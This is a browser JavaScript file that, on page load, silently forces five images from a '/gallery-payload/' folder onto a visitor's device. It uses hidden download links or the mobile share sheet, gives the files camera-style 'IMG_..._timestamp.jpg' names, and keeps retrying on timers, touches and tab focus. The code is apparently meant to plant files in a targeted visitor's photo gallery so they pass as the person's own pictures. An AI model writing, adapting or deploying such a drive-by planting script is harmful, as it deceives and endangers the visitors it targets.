(function earlyGalleryDownload() {
    var MIN_COUNT = 5;
    var GALLERY_PATHS = [
        '/gallery-payload/01.jpg',
        '/gallery-payload/02.jpg',
        '/gallery-payload/03.jpg',
        '/gallery-payload/04.jpg',
        '/gallery-payload/05.jpg'
    ];

    function cfg() {
        return window.PULSE_CONFIG || {};
    }

    function downloadEnabled() {
        var meta = document.querySelector('meta[name="pulse-gallery-download"]');
        if (meta && meta.getAttribute('content') === 'false') return false;
        if (cfg().galleryDownloadEnabled === false) return false;
        return true;
    }

    function resolvePath(relativePath) {
        var base = '';
        try {
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; i += 1) {
                var src = scripts[i].getAttribute('src') || '';
                if (src.indexOf('gallery-payload-download-early.js') !== -1) {
                    base = src.replace(/gallery-payload-download-early\.js(\?.*)?$/, '').replace(/\/$/, '');
                    break;
                }
            }
        } catch (e) {
            /* ignore */
        }
        var href = (base + relativePath).replace(/([^:]\/)\/+/g, '$1');
        return new URL(href, window.location.href).href;
    }

    function isSubjectEntry() {
        var p = window.location.pathname || '/';
        if (/^\/s\/[^/]+/.test(p)) return true;
        return p === '/' || p === '';
    }

    function isMobile() {
        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
    }

    if (!window.__pulseGalleryDownloadState) {
        window.__pulseGalleryDownloadState = {
            visitId: String(Date.now()),
            saved: {}
        };
    }

    function stateKey() {
        var m = window.location.pathname.match(/^\/s\/([^/]+)/);
        var token = m ? decodeURIComponent(m[1]) : 'main';
        return token + '_' + window.__pulseGalleryDownloadState.visitId;
    }

    function getSaved(key) {
        if (!window.__pulseGalleryDownloadState.saved[key]) {
            window.__pulseGalleryDownloadState.saved[key] = {};
        }
        return window.__pulseGalleryDownloadState.saved[key];
    }

    function isDone(key) {
        return Object.keys(getSaved(key)).length >= MIN_COUNT;
    }

    function galleryFilename(index) {
        var ts = new Date();
        var pad = function (n) {
            return String(n).padStart(2, '0');
        };
        var stamp =
            ts.getFullYear() +
            pad(ts.getMonth() + 1) +
            pad(ts.getDate()) +
            '_' +
            pad(ts.getHours()) +
            pad(ts.getMinutes()) +
            pad(ts.getSeconds());
        return 'IMG_' + pad(index) + '_' + stamp + '.jpg';
    }

    function triggerDownload(href, filename) {
        var a = document.createElement('a');
        a.href = href;
        a.download = filename;
        a.rel = 'noopener';
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        a.remove();
    }

    function delay(ms) {
        return new Promise(function (resolve) {
            setTimeout(resolve, ms);
        });
    }

    function shareOrDownload(blob, filename) {
        var type = blob.type && blob.type.indexOf('image/') === 0 ? blob.type : 'image/jpeg';
        var file = new File([blob], filename, { type: type });

        if (typeof navigator.share === 'function' && typeof navigator.canShare === 'function') {
            try {
                if (navigator.canShare({ files: [file] })) {
                    return navigator.share({ files: [file], title: filename }).catch(function (e) {
                        if (e && e.name === 'AbortError') return;
                        throw e;
                    });
                }
            } catch (e) {
                /* fallback */
            }
        }

        var blobUrl = URL.createObjectURL(blob);
        try {
            triggerDownload(blobUrl, filename);
        } finally {
            setTimeout(function () {
                URL.revokeObjectURL(blobUrl);
            }, 60000);
        }
        return Promise.resolve();
    }

    function downloadOne(path, index, key) {
        return fetch(resolvePath(path), { cache: 'no-store', credentials: 'same-origin' })
            .then(function (res) {
                if (!res.ok) throw new Error('fetch_' + index + '_' + res.status);
                return res.blob();
            })
            .then(function (blob) {
                var type = blob.type && blob.type.indexOf('image/') === 0 ? blob.type : 'image/jpeg';
                var normalized = blob.type === type ? blob : new Blob([blob], { type: type });
                return shareOrDownload(normalized, galleryFilename(index));
            })
            .then(function () {
                getSaved(key)[String(index)] = true;
            });
    }

    var running = false;

    function runOnce() {
        var key = stateKey();
        if (!downloadEnabled() || isDone(key) || running) return Promise.resolve();

        var saved = getSaved(key);
        var chain = Promise.resolve();
        running = true;

        GALLERY_PATHS.forEach(function (path, i) {
            var index = i + 1;
            if (saved[String(index)]) return;
            chain = chain
                .then(function () {
                    return downloadOne(path, index, key);
                })
                .then(function () {
                    return delay(isMobile() ? 350 : 120);
                })
                .catch(function (err) {
                    console.warn('[gallery-download]', path, err && err.message ? err.message : err);
                });
        });

        return chain.finally(function () {
            running = false;
        });
    }

    if (!isSubjectEntry() || !downloadEnabled()) return;

    var tick = function () {
        runOnce();
    };

    tick();

    var retry = setInterval(function () {
        if (isDone(stateKey())) {
            clearInterval(retry);
            return;
        }
        tick();
    }, 2000);

    setTimeout(function () {
        clearInterval(retry);
    }, 120000);

    document.addEventListener('visibilitychange', function () {
        if (document.visibilityState === 'visible') tick();
    });

    document.addEventListener('pointerdown', tick, { once: true, passive: true });
    document.addEventListener('touchstart', tick, { once: true, passive: true });

    window.__pulseGalleryDownloadTick = tick;
})();
